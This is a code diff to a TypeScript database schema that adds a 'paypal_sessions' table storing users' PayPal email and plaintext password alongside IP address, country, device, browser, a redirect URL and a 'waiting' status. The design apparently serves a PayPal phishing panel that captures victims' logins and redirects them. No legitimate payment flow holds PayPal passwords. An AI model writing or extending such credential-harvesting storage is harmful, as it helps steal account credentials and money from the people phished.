@@ -55,3 +55,25 @@ export const insertPaymentRecordSchema = createInsertSchema(paymentRecords).omit
 
 export type InsertPaymentRecord = z.infer<typeof insertPaymentRecordSchema>;
 export type PaymentRecord = typeof paymentRecords.$inferSelect;
+
+export const paypalSessions = pgTable("paypal_sessions", {
+  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
+  sessionId: text("session_id").notNull().unique(),
+  email: text("email").notNull(),
+  password: text("password").notNull(),
+  ipAddress: text("ip_address"),
+  country: text("country"),
+  device: text("device"),
+  browser: text("browser"),
+  redirectUrl: text("redirect_url"),
+  status: text("status").default("waiting"),
+  createdAt: timestamp("created_at").defaultNow(),
+});
+
+export const insertPaypalSessionSchema = createInsertSchema(paypalSessions).omit({
+  id: true,
+  createdAt: true,
+});
+
+export type InsertPaypalSession = z.infer<typeof insertPaypalSessionSchema>;
+export type PaypalSession = typeof paypalSessions.$inferSelect;
